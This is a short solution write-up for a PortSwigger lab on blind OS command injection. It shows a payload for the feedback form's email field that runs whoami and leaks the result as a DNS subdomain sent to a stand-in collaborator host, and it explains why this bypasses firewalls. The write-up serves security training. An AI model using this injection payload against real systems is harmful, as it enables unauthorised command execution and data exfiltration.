# Lab 06 — Blind OS command injection with out-of-band data exfiltration

> **Expert** · [Official lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

**Entry point:** `POST /feedback` (`email` field) · **Goal:** exfiltrate
`whoami` through a DNS subdomain.

## Solution

1. Backtick-substitute the command output into the lookup:

```
email=||nslookup+`whoami`.YOUR-COLLABORATOR-SUBDOMAIN||
```

2. **Poll now** → the interaction's Description shows the full domain:
   `carlos.YOUR-COLLABORATOR-SUBDOMAIN` — the subdomain **is** the command
   output.
3. Submit `carlos` — lab solved.

## Notes

Backticks nest command execution inside the argument; DNS labels carry the
data out with no inbound firewall needed.
